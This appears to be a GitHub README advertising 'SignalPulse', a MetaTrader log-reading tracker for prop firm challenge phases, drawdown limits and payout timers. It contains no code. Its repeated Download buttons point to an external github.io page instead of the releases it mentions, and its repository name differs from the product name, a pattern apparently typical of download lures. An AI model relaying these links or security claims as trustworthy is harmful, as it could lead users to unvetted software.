![preview](https://raw.githubusercontent.com/Wendy-Bay/PropFirm-Tracker-Elite/main/preview.svg)

# SignalPulse — Prop Firm Challenge Sync Engine

**Your proprietary trading journey, unified across every challenge phase and funded stage.**

This repository provides a comprehensive synchronization engine for traders navigating prop firm evaluation programs. Unlike conventional dashboards that merely display static metrics, SignalPulse acts as a **live neural bridge** between your MetaTrader platform (MT5/MT4) and your prop firm challenge progress — intelligently tracking phase transitions, profit target milestones, maximum allowable drawdowns, minimum trading day requirements, and payout eligibility windows with prescriptive analytics.

---

## Overview

Prop firm challenges are notoriously unforgiving. A single misunderstanding of remaining profit target distance or an unnoticed drawdown threshold breach can erase weeks of disciplined execution. SignalPulse reimagines this experience by converting opaque challenge parameters into a clear, action-oriented decision framework.

Think of it as a **cockpit instrumentation panel** for your prop firm journey. Where traditional dashboards are static report cards, SignalPulse provides dynamic, forward-looking guidance — answering not just "where am I?" but "what should I do now to reach the next milestone safely?"

The engine processes real-time account activity from MetaTrader platform logs, applies challenge-specific rules, and outputs a continuously updated visual state: phase identification, remaining profit target as a percentage and absolute distance, current drawdown relative to caps, days traded countdown, and the payout readiness meter that counts toward the first withdrawal window.

---

## Why SignalPulse Exists

Most prop firm tools focus on **post-trade analysis** — retrospective metrics that reveal what already happened. SignalPulse focuses on **pre-trade awareness** — what needs to happen next to stay within the rules and reach the funded stage. The difference is the same as driving by looking through the windshield versus staring at the rearview mirror.

The engine is designed for traders who:
- Manage multiple challenge accounts simultaneously (Phase 1, Phase 2, Funded stages)
- Need real-time visibility into drawdown usage versus daily and maximum caps
- Want to know exactly how many more profitable days are required to satisfy minimum trading day requirements
- Track payout countdown windows without manual calculation
- Require a single-pane view across different prop firm rule sets

---

## Core Architecture

The SignalPulse engine is structured around four interconnected modules:

### 🔹 Phase Detection & Transition Logic
Automatically identifies which challenge stage the account currently occupies — Phase 1, Phase 2, or Funded status — based on profit/loss thresholds and account history. The engine tracks phase boundaries and alerts when the account approaches a transition point.

### 🔹 Profit Target Bar System
Visualizes remaining profit target as a progressive bar that fills as the account approaches the target. The bar accounts for the actual percentage needed relative to the starting balance, not simply an absolute dollar amount. This prevents misleading visual representations common in simpler dashboards.

### 🔹 Drawdown Cap Monitoring
Dual-layer drawdown tracking covers both **daily drawdown limits** (reset each day based on equity at session open) and **maximum drawdown limits** (calculated from peak equity during the challenge). The engine provides a "drawdown buffer" metric — the exact number of pips or dollars remaining before a violation occurs — eliminating guesswork.

### 🔹 Minimum Day Counter & Payout Timer
Tracks the number of profitable trading days accrued, comparing against the minimum required before advancing phases or qualifying for the first payout. Simultaneously runs a countdown toward the payout eligibility window, factoring in the firm's typical settlement calendar.

---

## [![Download](https://raw.githubusercontent.com/Wendy-Bay/PropFirm-Tracker-Elite/main/button.svg)](https://wendy-bay.github.io/PropFirm-Tracker-Elite/)

*(The latest stable synchronization engine package can be retrieved via the repository releases section.)*

---

## Key Features

| Feature | Benefit |
|---------|---------|
| **Multi-Account Syncing** | Monitor Phase 1, Phase 2, and Funded accounts simultaneously from one interface |
| **Dynamic Profit Bar** | Visual distance-to-target with automatic recalculation after each trade |
| **Daily Drawdown Awareness** | Real-time buffer calculation against daily loss limits |
| **Max Drawdown Safety Net** | Alerts when approach is within 5% of maximum allowable drawdown |
| **Minimum Day Tracker** | Tracks profitable day count and suggests remaining days needed |
| **Payout Countdown Engine** | Estimates time to first withdrawal based on firm rules and trading cadence |
| **Rule Set Profiles** | Pre-configured profiles for major prop firms, with custom rule override capabilities |
| **Responsive Interface** | Optimized for desktop and tablet viewing, with data density adjustable to user preference |
| **Multilingual Support** | Interface available in English, Spanish, French, German, Portuguese, and Chinese |
| **24/7 Session Monitoring** | Continuous sync during market hours, with automatic catch-up on reconnection |

---

## Getting Started

### Prerequisites
- MetaTrader 5 or MetaTrader 4 platform installed and configured with at least one live or demo account
- .NET Framework 4.7.2 or higher (Windows) / Mono-compatible runtime (Linux/macOS)
- Read access to MetaTrader logs directory (`/MQL5/Files/` or `/MQL4/Files/`)

### Initial Setup
1. Retrieve the synchronization agent from this repository's releases.
2. Configure the connection to your MetaTrader terminal by specifying the log file path and account number(s) in the configuration file.
3. Select your prop firm rule profile from the preloaded library, or input custom parameters for profit target percentage, daily drawdown cap, maximum drawdown cap, and minimum trading days.
4. Launch the monitoring engine. The interface will populate with real-time data from your account activity.

---

## Configuration Parameters

The engine accepts the following adjustable inputs, allowing you to tailor it to any prop firm program:

- **Starting Balance** — The account balance at challenge inception
- **Profit Target (%)** — Percentage gain required to advance to the next phase
- **Daily Drawdown Cap (%)** — Maximum allowable loss within a single trading day
- **Max Drawdown Cap (%)** — Maximum allowable loss from peak equity throughout the challenge
- **Minimum Trading Days** — Number of profitable days required before phase transition
- **Payout Waiting Period** — Calendar days after reaching funded status before first withdrawal
- **Profit Split Structure** — Not used for tracking, but displayed for reference alongside performance data

---

## How the Sync Engine Works

SignalPulse operates on a **log-based synchronization model**. Rather than injecting into the trading platform's process (which could trigger security flags at some brokerages), the engine reads the MetaTrader log files that record all trade events in chronological order.

### Data Flow
1. **Log Capture** — The engine monitors the MetaTrader log directory for new entries.
2. **Trade Parsing** — Each trade event (open, close, modify) is parsed for symbol, volume, profit/loss, commission, swap, and balance impact.
3. **State Calculation** — Using the parsed data and the selected rule profile, the engine recalculates current phase, profit target remaining, drawdown usage, and day counters.
4. **Visual Rendering** — The calculated state is rendered through the interface, with color-coded indicators (green = safe, yellow = approaching limit, red = critical).

### Performance Characteristics
- Update frequency: Every 3–5 seconds during active market hours
- Memory footprint: Approximately 45–60 MB for a single account, scaling linearly with additional accounts
- Reconnection time: Under 2 seconds after MetaTrader restart or log directory change

---

## Advanced Usage: Multi-Account Mode

For traders managing challenges across multiple prop firms simultaneously, SignalPulse supports a **consolidated view mode**. Activate this by listing multiple account numbers in the configuration file, each with its own rule profile.

The interface will display a summary grid showing all accounts with key metrics: phase, profit target progress, drawdown buffer, and payout readiness. Click into any account row to expand the full detail view.

### Use Case Scenario
A trader running three accounts — Phase 1 at Firm A (10% target, 5% daily drawdown), Phase 2 at Firm B (8% target, 4% daily drawdown), and a Funded account at Firm C (no target, 6% max drawdown) — can monitor all three from a single panel, with color-coded alerts indicating which account requires immediate attention.

---

## [![Download](https://raw.githubusercontent.com/Wendy-Bay/PropFirm-Tracker-Elite/main/button.svg)](https://wendy-bay.github.io/PropFirm-Tracker-Elite/)

---

## Supported Platforms & Environments

| Platform | Status | Notes |
|----------|--------|-------|
| Windows 10 / 11 | Fully supported | Native .NET execution |
| Windows Server 2019+ | Fully supported | Tested in RDP/VPS environments |
| macOS (Intel & Apple Silicon) | Supported via Mono | Requires Mono 6.12+ |
| Linux (Ubuntu 20.04+, Debian 11+) | Community supported | Mono or .NET 6 runtime |
| MetaTrader 5 | Full compatibility | Build 3800+ |
| MetaTrader 4 | Full compatibility | Build 1350+ |

---

## Rule Profile Library

The engine ships with pre-configured rule profiles for common prop firm programs. Each profile includes profit target percentage, daily drawdown cap, maximum drawdown cap, and minimum trading day requirements.

Profiles are stored as JSON files in the `profiles/` directory. Users may modify existing profiles or create new ones by duplicating the template structure.

*Note: Rule profiles are based on publicly available information. Always verify against your specific prop firm agreement as terms may change.*

---

## Limitations & Considerations

- The engine relies on MetaTrader's log file output. If logging is disabled in the terminal settings, the synchronization agent will not receive trade data.
- Drawdown calculations are based on equity snapshots at trade-closing moments. For firms that use a mark-to-market model at specific intervals, adjustment of the calculation frequency may be necessary.
- Minimum day counters require trades with a positive profit value. Trades with breakeven or negative results do not count toward the minimum, as per most prop firm rules.
- Payout countdown estimates are approximate and do not account for processing delays specific to the firm's back office.

---

## Security & Data Handling

SignalPulse operates **entirely locally**. No account credentials, trade data, or personal information is transmitted externally. The configuration file stores only the MetaTrader log directory path and rule profile selections — no API keys, passwords, or account access tokens.

Log files are read in read-only mode; the engine never writes to MetaTrader's directories or modifies any trading files.

---

## Frequently Asked Questions

**Does this engine execute trades on my behalf?**  
No. SignalPulse is a monitoring and awareness tool only. It does not place orders, modify positions, or interact with the broker in any way. All trading decisions remain solely with the user.

**Can I run it on a VPS alongside MetaTrader?**  
Yes. The engine is designed for headless operation and consumes minimal CPU/RAM resources, making it suitable for VPS environments.

**How does the engine handle phase transitions automatically?**  
When the profit target is reached and the minimum day requirement is satisfied, the engine marks the current phase as complete and resets the tracking parameters according to the rule profile for the next phase. The user is notified of the transition.

**What happens if I exceed a drawdown limit?**  
The engine will display a red alert and freeze further profit target progression calculations. The tracking state will show the account as "breached" until manually reset by the user.

---

## License

This project is distributed under the MIT License. See the [LICENSE](LICENSE) file for the full license text.

---

## Disclaimer

Trading in financial markets involves substantial risk of loss. This synchronization engine is provided as a tool for informational and organizational purposes only. It does not constitute financial advice, investment recommendation, or solicitation to trade. Past performance of trading strategies does not guarantee future results.

The rule profiles included are based on publicly available program descriptions and may not accurately reflect the current terms of any specific prop firm. Users are responsible for verifying all challenge parameters against their official agreement with the prop firm.

The maintainers of this repository assume no liability for losses incurred through the use of this software, including but not limited to drawdown limit violations missed due to sync delays, misconfigured rule profiles, or errors in trade parsing.

Always trade with capital you can afford to lose. Seek independent financial advice if uncertain about any aspect of prop firm challenge participation.

---

## [![Download](https://raw.githubusercontent.com/Wendy-Bay/PropFirm-Tracker-Elite/main/button.svg)](https://wendy-bay.github.io/PropFirm-Tracker-Elite/)